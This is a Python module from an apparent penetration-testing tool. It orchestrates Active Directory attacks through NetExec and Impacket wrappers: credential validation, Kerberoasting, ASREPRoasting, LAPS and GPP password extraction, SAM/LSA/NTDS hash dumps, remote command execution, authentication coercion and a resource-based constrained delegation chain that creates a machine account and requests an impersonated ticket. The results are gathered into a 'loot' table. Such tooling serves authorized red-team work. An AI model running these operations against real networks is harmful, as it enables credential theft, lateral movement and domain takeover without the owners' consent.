"""The sweep orchestration: run the protocol validations and the opt-in
offensive actions, redact every credential out of the report, and fold the
transcripts into a summary and a loot table."""

from __future__ import annotations

import os
import sys
import tempfile
import time
from typing import List, Optional, Tuple

from kitsune import tools
from kitsune.context import RunContext
from kitsune.engine import Plugin
from kitsune.model import (
    CheckResult,
    SweepFinding,
    ad_payload,
    protocol_payload,
    spn_payload,
)
from kitsune.shell import CommandSpec, run
from kitsune.sweep import clock, loot
from kitsune.sweep.parsers import (
    extract_asrep_hashes,
    extract_cpasswords,
    extract_hashdump_lines,
    extract_tgs_hashes,
    parse_nxc,
)
from kitsune.sweep.wrapper import (
    IMPERSONATED_ACCOUNT,
    SweepRequest,
    asrep_outfile,
    build_addcomputer,
    build_asreproast,
    build_coerce,
    build_command,
    build_dump,
    build_exec,
    build_getgpp,
    build_getst,
    build_getuserspns,
    build_kerberoast,
    build_laps,
    build_rbcd,
    build_rbcd_write,
    build_secretsdump,
    default_getst_spn,
    pick_wrapper,
)
from kitsune.util import lines, mask, mask_credential_tokens, redact, redact_argv

RBCD_ATTACK_ID = "sweep.rbcd_attack"
RBCD_ADDCOMPUTER_ID = "sweep.rbcd.addcomputer"
RBCD_WRITE_ID = "sweep.rbcd.write"
RBCD_GETST_ID = "sweep.rbcd.getst"


def parse_transcript(text: str) -> List[SweepFinding]:
    """Findings parsed from a *saved* transcript, masked by shape (the offline
    --parse-file path has no supplied credential to redact against)."""
    out = []
    for f in parse_nxc(text):
        f.detail = mask_credential_tokens(f.detail)
        out.append(f)
    return out


class _Progress:
    def __init__(self, enabled: bool) -> None:
        self.enabled = enabled
        self.step = 0
        self.start = time.monotonic()

    def begin(self, target: str, label: str) -> None:
        if not self.enabled:
            return
        self.step += 1
        try:
            print(
                f"[sweep #{self.step:<2} +{int(time.monotonic() - self.start):>3}s] {target}  {label}",
                file=sys.stderr,
            )
        except Exception:  # noqa: BLE001
            pass

    def finish(self) -> None:
        if not self.enabled:
            return
        try:
            print(
                f"[sweep done] {self.step} steps in {int(time.monotonic() - self.start)}s",
                file=sys.stderr,
            )
        except Exception:  # noqa: BLE001
            pass


# --------------------------------------------------------------------------
# redaction helpers
# --------------------------------------------------------------------------


def _redact_all(text: str, secrets: List[Optional[str]]) -> str:
    acc = text
    for s in secrets:
        acc = redact(acc, s)
    return acc


def _redact_argv_all(argv: List[str], secrets: List[Optional[str]]) -> List[str]:
    return [_redact_all(a, secrets) for a in argv]


def _redacted_lines(stdout: str, secrets: List[Optional[str]]) -> List[str]:
    return [_redact_all(line, secrets) for line in lines(stdout)]


def _redact_findings(findings: List[SweepFinding], secret: Optional[str]) -> List[SweepFinding]:
    for f in findings:
        f.detail = redact(f.detail, secret)
    return findings


def _redact_cpasswords(pairs):
    return [(cipher, mask(plain) if plain is not None else None) for cipher, plain in pairs]


# --------------------------------------------------------------------------
# small pure helpers
# --------------------------------------------------------------------------


def _with_faketime(spec: CommandSpec, ft_args: Optional[List[str]]) -> CommandSpec:
    return spec.faketime(ft_args) if ft_args else spec


def faketime_manual_args(spec: str) -> List[str]:
    if spec.startswith("+") or spec.startswith("-"):
        return ["-f", spec]
    return [spec]


def _is_admin_marker(findings: List[SweepFinding]) -> bool:
    return any("pwn3d" in f.detail.lower() for f in findings)


def _dump_skip(admin_here: Optional[bool], target: str, cid: str, title: str) -> Optional[CheckResult]:
    if admin_here is False:
        return CheckResult.skipped(
            cid,
            "sweep",
            title,
            f"{target}: the credential is not local admin here (no Pwn3d! over SMB); a SAM/LSA/NTDS "
            "dump needs admin on the target — run it against a host where the credential is admin "
            "(a member server), not the DC",
        )
    return None


def _non_empty(value: Optional[str]) -> Optional[str]:
    if value is not None and value != "":
        return value
    return None


def _getst_inputs(spn: Optional[str], impersonate: Optional[str], delegate_to: str) -> Tuple[str, str]:
    return (
        spn if spn is not None else default_getst_spn(delegate_to),
        impersonate if impersonate is not None else IMPERSONATED_ACCOUNT,
    )


def _exec_id(powershell: bool, protocol: str) -> str:
    family = "sweep.exec_ps" if powershell else "sweep.exec"
    return f"{family}.{protocol}"


def _exec_protocols(protocols: List[str]) -> List[str]:
    return [p for p in protocols if p != tools.Protocol.LDAP]


def _rbcd_secrets(cid: str, req: SweepRequest, machine_pass: str, ccache: str) -> List[Optional[str]]:
    secrets: List[Optional[str]] = [req.credential.secret(), machine_pass]
    if cid == RBCD_GETST_ID:
        secrets.append(ccache)
    return secrets


class Sweep(Plugin):
    meta = (
        "sweep",
        "Credential/AD sweep",
        "Validates a credential against SMB/LDAP/WinRM/MSSQL/WMI and enumerates what it can see.",
    )

    def run(self, ctx: RunContext) -> List[CheckResult]:
        if ctx.credential is None:
            return [
                CheckResult.skipped(
                    "sweep.credential",
                    "sweep",
                    "Credential sweep",
                    "no credential provided; pass --username and one of --password/--ntlm/--aes/--ticket",
                )
            ]
        username = ctx.options.sweep_username
        if username is None:
            return [CheckResult.skipped("sweep.credential", "sweep", "Credential sweep", "no username provided (--username)")]
        tool = pick_wrapper(ctx.backend_inventory)
        if tool is None:
            return [
                CheckResult.unavailable(
                    "sweep.wrapper",
                    "sweep",
                    "Credential sweep",
                    "no NetExec/Impacket wrapper found (nxc/netexec/crackmapexec)",
                )
            ]

        targets = [t.strip() for t in ctx.target.split(",") if t.strip()]
        timeout = float(ctx.options.timeout_secs)

        faketime_args, clock_check = self._resolve_faketime(ctx, targets, timeout)

        checks: List[CheckResult] = []
        if clock_check is not None:
            checks.append(clock_check)
        validity: List[Tuple[str, str, bool]] = []
        progress = _Progress(ctx.options.sweep_progress)
        for target in targets:
            req = SweepRequest(
                target=target,
                dc_ip=ctx.options.sweep_dc_ip,
                domain=ctx.options.sweep_domain,
                username=username,
                credential=ctx.credential,
                local_auth=ctx.options.sweep_local_auth,
                faketime=faketime_args,
            )
            checks.extend(self._run_target(ctx, tool, req, timeout, validity, progress))
        progress.finish()
        checks.append(self._summarize(validity))

        found = loot.from_checks(checks)
        if not loot.is_empty(found):
            checks.append(CheckResult.success("sweep.loot", "sweep", "Reusable domain facts", found))

        return checks

    # ----------------------------------------------------------------- target

    def _run_target(self, ctx, tool, req, timeout, validity, progress) -> List[CheckResult]:
        secret = req.credential.secret()
        checks: List[CheckResult] = []
        admin_here: Optional[bool] = None

        for protocol in ctx.options.sweep_protocols:
            title = f"{protocol.upper()} credential validation"
            progress.begin(req.target, title)
            spec = _with_faketime(build_command(protocol, req, tool, timeout), req.faketime)
            source = redact(" ".join(spec.argv()), secret)
            try:
                out = run(spec)
            except Exception as e:  # noqa: BLE001
                checks.append(CheckResult.failed(f"sweep.{protocol}", "sweep", title, e))
                continue
            findings = _redact_findings(parse_nxc(out.combined()), secret)
            works = any(f.credential_works for f in findings)
            if protocol == tools.Protocol.SMB:
                admin_here = _is_admin_marker(findings) if works else None
            validity.append((req.target, protocol, works))
            payload = protocol_payload(
                _redact_argv_all(out.argv, [secret]),
                out.exit_code(),
                out.timed_out(),
                works,
                findings,
                req.target,
            )
            checks.append(
                CheckResult.success(f"sweep.{protocol}", "sweep", title, payload)
                .with_backend(tool.program)
                .with_source(source)
            )

        o = ctx.options
        if o.sweep_spn:
            progress.begin(req.target, "SPN enumeration (GetUserSPNs)")
            checks.append(self._run_spn(ctx, req, timeout))
        if o.sweep_asreproast:
            progress.begin(req.target, "ASREPRoast")
            checks.append(self._run_asreproast(tool, req, timeout))
        if o.sweep_laps:
            progress.begin(req.target, "LAPS passwords")
            checks.append(self._run_laps(tool, req, timeout))
        if o.sweep_gpp:
            progress.begin(req.target, "GPP cpassword")
            checks.append(self._run_gpp(ctx, req, timeout))
        if o.sweep_rbcd:
            progress.begin(req.target, "RBCD enumeration")
            checks.append(self._run_rbcd(tool, req, timeout))
        if o.sweep_exec is not None:
            progress.begin(req.target, "command execution (-x)")
            checks.extend(self._run_exec(ctx, req, tool, o.sweep_exec, False, timeout))
        if o.sweep_exec_ps is not None:
            progress.begin(req.target, "command execution (-X)")
            checks.extend(self._run_exec(ctx, req, tool, o.sweep_exec_ps, True, timeout))
        if o.sweep_sam:
            checks.append(self._maybe_dump(admin_here, req, "sweep.sam", "SAM database dump", progress, lambda: self._run_sam(tool, req, timeout), "SAM dump"))
        if o.sweep_lsa:
            checks.append(self._maybe_dump(admin_here, req, "sweep.lsa", "LSA secrets dump", progress, lambda: self._run_lsa(tool, req, timeout), "LSA secrets dump"))
        if o.sweep_ntds:
            checks.append(self._maybe_dump(admin_here, req, "sweep.ntds", "NTDS.dit dump", progress, lambda: self._run_ntds(tool, req, timeout), "NTDS.dit dump"))
        if o.sweep_secretsdump:
            checks.append(self._maybe_dump(admin_here, req, "sweep.secretsdump", "SAM/LSA/NTDS dump (secretsdump)", progress, lambda: self._run_secretsdump(ctx, req, timeout), "secretsdump"))
        if o.sweep_kerberoast:
            progress.begin(req.target, "Kerberoast (TGS request)")
            checks.append(self._run_kerberoast(ctx, req, timeout))
        if o.sweep_rbcd_attack:
            progress.begin(req.target, "RBCD attack chain")
            checks.extend(self._run_rbcd_attack(ctx, req, timeout))
        if o.sweep_coerce is not None:
            progress.begin(req.target, "authentication coercion")
            checks.append(self._run_coerce(ctx, req, o.sweep_coerce, timeout))

        return checks

    def _maybe_dump(self, admin_here, req, cid, title, progress, runner, label) -> CheckResult:
        skip = _dump_skip(admin_here, req.target, cid, title)
        if skip is not None:
            return skip
        progress.begin(req.target, label)
        return runner()

    # --------------------------------------------------------------- faketime

    def _resolve_faketime(self, ctx, targets, timeout):
        spec = ctx.options.sweep_faketime
        if spec is not None:
            data = {
                "dc": None,
                "dc_time_utc": None,
                "skew_secs": None,
                "faketime_applied": True,
                "faketime_spec": spec,
                "note": f"faketime supplied verbatim by --faketime: `{spec}`",
            }
            check = CheckResult.success("sweep.clock", "sweep", "DC clock skew", data).with_backend(tools.FAKETIME.program)
            return faketime_manual_args(spec), check
        if ctx.options.sweep_fix_time:
            return self._fix_time(ctx, targets, timeout)
        return None, None

    def _fix_time(self, ctx, targets, timeout):
        cid, title = "sweep.clock", "DC clock skew"
        dc = ctx.options.sweep_dc_ip or (targets[0] if targets else None)
        if dc is None:
            return None, None
        have_faketime = ctx.backend_inventory.has(tools.FAKETIME.program)
        probed = clock.probe_dc_time(dc, timeout)

        if probed is None:
            args, applied = None, False
            note = (
                f"could not read the {dc} clock — install nmap (it runs the smb2-time script) "
                "and check that 445 is reachable"
            )
        elif have_faketime:
            args = ["-f", f"{probed.skew_secs:+d}"]
            applied = True
            note = (
                f"DC clock skew {probed.skew_secs}s — running every wrapper under "
                f"`faketime -f {probed.skew_secs:+d}`"
            )
        else:
            args, applied = None, False
            note = (
                f"DC clock skew {probed.skew_secs}s but faketime not found — install libfaketime, "
                "or Kerberos keeps failing with KRB_AP_ERR_SKEW"
            )

        data = {
            "dc": dc,
            "dc_time_utc": probed.dc_time_utc if probed else None,
            "skew_secs": probed.skew_secs if probed else None,
            "faketime_applied": applied,
            "note": note,
        }
        if applied:
            check = CheckResult.success(cid, "sweep", title, data)
        else:
            check = CheckResult.skipped(cid, "sweep", title, note)
            check.data = data
        check.with_backend(tools.NMAP.program)
        return args, check

    # ------------------------------------------------------------------- run_ad

    def _run_ad(self, cid, title, spec, secrets, backend, faketime):
        """Returns (ran, failed). ``ran`` is (payload, raw_stdout, source) or
        None; ``failed`` is a CheckResult or None."""
        if spec is None:
            return None, CheckResult.failed(cid, "sweep", title, "could not build command").with_backend(backend)
        spec = _with_faketime(spec, faketime)
        source = _redact_all(" ".join(spec.argv()), secrets)
        try:
            out = run(spec)
        except Exception as e:  # noqa: BLE001
            return None, CheckResult.failed(cid, "sweep", title, e).with_backend(backend).with_source(source)
        combined = out.combined()
        payload = ad_payload(
            _redact_argv_all(out.argv, secrets),
            out.exit_code(),
            out.timed_out(),
            _redact_all(combined, secrets),
            _redacted_lines(combined, secrets),
        )
        return (payload, combined, source), None

    # ------------------------------------------------------------------ checks

    def _run_spn(self, ctx, req, timeout) -> CheckResult:
        cid, title = "sweep.spn", "Service principal names (GetUserSPNs)"
        tool = tools.GET_USER_SPNS
        if not ctx.backend_inventory.has(tool.program):
            return CheckResult.unavailable(cid, "sweep", title, "impacket-GetUserSPNs not found")
        spec = build_getuserspns(req, timeout)
        if spec is None:
            return CheckResult.failed(cid, "sweep", title, "could not build GetUserSPNs command")
        spec = _with_faketime(spec, req.faketime)
        secret = req.credential.secret()
        source = redact(" ".join(spec.argv()), secret)
        try:
            out = run(spec)
        except Exception as e:  # noqa: BLE001
            return CheckResult.failed(cid, "sweep", title, e)
        payload = spn_payload(
            _redact_argv_all(out.argv, [secret]),
            out.exit_code(),
            _redacted_lines(out.combined(), [secret]),
        )
        return CheckResult.success(cid, "sweep", title, payload).with_backend(tool.program).with_source(source)

    def _run_hashdump(self, cid, title, spec, req, backend) -> CheckResult:
        secrets = [req.credential.secret()]
        ran, failed = self._run_ad(cid, title, spec, secrets, backend, req.faketime)
        if failed is not None:
            return failed
        payload, raw_stdout, source = ran
        payload = dict(payload)
        payload["hashes"] = extract_hashdump_lines(raw_stdout)
        return CheckResult.success(cid, "sweep", title, payload).with_backend(backend).with_source(source)

    def _run_sam(self, tool, req, timeout) -> CheckResult:
        return self._run_hashdump("sweep.sam", "SAM database dump", build_dump(tool, req, timeout, "--sam"), req, tool.program)

    def _run_lsa(self, tool, req, timeout) -> CheckResult:
        return self._run_hashdump("sweep.lsa", "LSA secrets dump", build_dump(tool, req, timeout, "--lsa"), req, tool.program)

    def _run_ntds(self, tool, req, timeout) -> CheckResult:
        return self._run_hashdump("sweep.ntds", "NTDS.dit dump", build_dump(tool, req, timeout, "--ntds"), req, tool.program)

    def _run_secretsdump(self, ctx, req, timeout) -> CheckResult:
        cid, title = "sweep.secretsdump", "SAM/LSA/NTDS dump (secretsdump)"
        tool = tools.SECRETSDUMP
        if not ctx.backend_inventory.has(tool.program):
            return CheckResult.unavailable(cid, "sweep", title, "impacket-secretsdump not found")
        return self._run_hashdump(cid, title, build_secretsdump(req, timeout), req, tool.program)

    def _run_kerberoast(self, ctx, req, timeout) -> CheckResult:
        cid, title = "sweep.kerberoast", "Kerberoast (TGS request)"
        tool = tools.GET_USER_SPNS
        if not ctx.backend_inventory.has(tool.program):
            return CheckResult.unavailable(cid, "sweep", title, "impacket-GetUserSPNs not found")
        secrets = [req.credential.secret()]
        ran, failed = self._run_ad(cid, title, build_kerberoast(req, timeout), secrets, tool.program, req.faketime)
        if failed is not None:
            return failed
        payload, raw_stdout, source = ran
        payload = dict(payload)
        payload["tgs_hashes"] = extract_tgs_hashes(raw_stdout)
        return CheckResult.success(cid, "sweep", title, payload).with_backend(tool.program).with_source(source)

    def _run_coerce(self, ctx, req, listener, timeout) -> CheckResult:
        cid, title = "sweep.coerce", "Authentication coercion (coercer)"
        tool = tools.COERCER
        if not ctx.backend_inventory.has(tool.program):
            return CheckResult.unavailable(cid, "sweep", title, "coercer not found")
        secrets = [req.credential.secret()]
        ran, failed = self._run_ad(cid, title, build_coerce(req, listener, timeout), secrets, tool.program, req.faketime)
        if failed is not None:
            return failed
        payload, _raw, source = ran
        return CheckResult.success(cid, "sweep", title, payload).with_backend(tool.program).with_source(source)

    def _run_asreproast(self, tool, req, timeout) -> CheckResult:
        cid, title = "sweep.asreproast", "ASREPRoast (pre-auth disabled accounts)"
        secrets = [req.credential.secret()]
        outfile = asrep_outfile()
        ran, failed = self._run_ad(cid, title, build_asreproast(tool, req, timeout), secrets, tool.program, req.faketime)
        try:
            os.remove(outfile)
        except OSError:
            pass
        if failed is not None:
            return failed
        payload, raw_stdout, source = ran
        payload = dict(payload)
        payload["asrep_hashes"] = extract_asrep_hashes(raw_stdout)
        return CheckResult.success(cid, "sweep", title, payload).with_backend(tool.program).with_source(source)

    def _run_laps(self, tool, req, timeout) -> CheckResult:
        cid, title = "sweep.laps", "LAPS passwords"
        secrets = [req.credential.secret()]
        ran, failed = self._run_ad(cid, title, build_laps(tool, req, timeout), secrets, tool.program, req.faketime)
        if failed is not None:
            return failed
        payload, _raw, source = ran
        return CheckResult.success(cid, "sweep", title, payload).with_backend(tool.program).with_source(source)

    def _run_gpp(self, ctx, req, timeout) -> CheckResult:
        cid, title = "sweep.gpp", "Group Policy Preferences cpassword"
        tool = tools.GET_GPP_PASSWORD
        if not ctx.backend_inventory.has(tool.program):
            return CheckResult.unavailable(cid, "sweep", title, "impacket-Get-GPPPassword not found")
        secrets = [req.credential.secret()]
        ran, failed = self._run_ad(cid, title, build_getgpp(req, timeout), secrets, tool.program, req.faketime)
        if failed is not None:
            return failed
        payload, raw_stdout, source = ran
        payload = dict(payload)
        payload["decrypted_cpasswords"] = [list(p) for p in _redact_cpasswords(extract_cpasswords(raw_stdout))]
        return CheckResult.success(cid, "sweep", title, payload).with_backend(tool.program).with_source(source)

    def _run_rbcd(self, tool, req, timeout) -> CheckResult:
        cid, title = "sweep.rbcd", "Resource-Based Constrained Delegation"
        secrets = [req.credential.secret()]
        ran, failed = self._run_ad(cid, title, build_rbcd(tool, req, timeout), secrets, tool.program, req.faketime)
        if failed is not None:
            return failed
        payload, _raw, source = ran
        return CheckResult.success(cid, "sweep", title, payload).with_backend(tool.program).with_source(source)

    def _run_exec(self, ctx, req, tool, cmd, powershell, timeout) -> List[CheckResult]:
        secrets = [req.credential.secret()]
        out: List[CheckResult] = []
        for protocol in _exec_protocols(ctx.options.sweep_protocols):
            cid = _exec_id(powershell, protocol)
            title = f"{protocol.upper()} command execution"
            spec = build_exec(protocol, req, tool, cmd, powershell, timeout)
            ran, failed = self._run_ad(cid, title, spec, secrets, tool.program, req.faketime)
            if failed is not None:
                out.append(failed)
            else:
                payload, _raw, source = ran
                out.append(CheckResult.success(cid, "sweep", title, payload).with_backend(tool.program).with_source(source))
        return out

    def _run_rbcd_attack(self, ctx, req, timeout) -> List[CheckResult]:
        machine = _non_empty(ctx.options.sweep_machine)
        machine_pass = _non_empty(ctx.options.sweep_machine_pass)
        delegate_to = _non_empty(ctx.options.sweep_delegate_to)
        if machine is None or machine_pass is None or delegate_to is None:
            return [
                CheckResult.failed(
                    RBCD_ATTACK_ID,
                    "sweep",
                    "RBCD attack",
                    "requires --machine, --machine-pass and --delegate-to (none empty)",
                )
            ]

        spn, impersonate = _getst_inputs(ctx.options.sweep_getst_spn, ctx.options.sweep_impersonate, delegate_to)
        ccache = os.path.join(tempfile.gettempdir(), f"kitsune-{machine}.ccache")
        specs = [
            (RBCD_ADDCOMPUTER_ID, "Create the machine account (addcomputer)", tools.ADD_COMPUTER, build_addcomputer(req, machine, machine_pass, timeout)),
            (RBCD_WRITE_ID, "Write the RBCD delegation (rbcd)", tools.RBCD, build_rbcd_write(req, machine, delegate_to, timeout)),
            (RBCD_GETST_ID, "Request the impersonated ticket (getST)", tools.GET_ST, build_getst(req, machine, machine_pass, spn, impersonate, ccache, timeout)),
        ]

        out: List[CheckResult] = []
        stopped = False
        for cid, title, tool, spec in specs:
            if stopped:
                out.append(CheckResult.skipped(cid, "sweep", title, "previous step failed"))
                continue
            if not ctx.backend_inventory.has(tool.program):
                out.append(CheckResult.unavailable(cid, "sweep", title, f"{tool.program} not found"))
                stopped = True
                continue
            secrets = _rbcd_secrets(cid, req, machine_pass, ccache)
            ran, failed = self._run_ad(cid, title, spec, secrets, tool.program, req.faketime)
            if failed is not None:
                out.append(failed)
                stopped = True
                continue
            payload, _raw, source = ran
            if cid == RBCD_GETST_ID:
                payload = dict(payload)
                payload["ticket_ccache"] = ccache
            out.append(CheckResult.success(cid, "sweep", title, payload).with_backend(tool.program).with_source(source))
        return out

    def _summarize(self, validity) -> CheckResult:
        by_host: dict = {}
        for host, protocol, works in validity:
            by_host.setdefault(host, {})[protocol] = works
        return CheckResult.success(
            "sweep.summary",
            "sweep",
            "Credential validity summary",
            {"validity_by_host_protocol": by_host},
        )
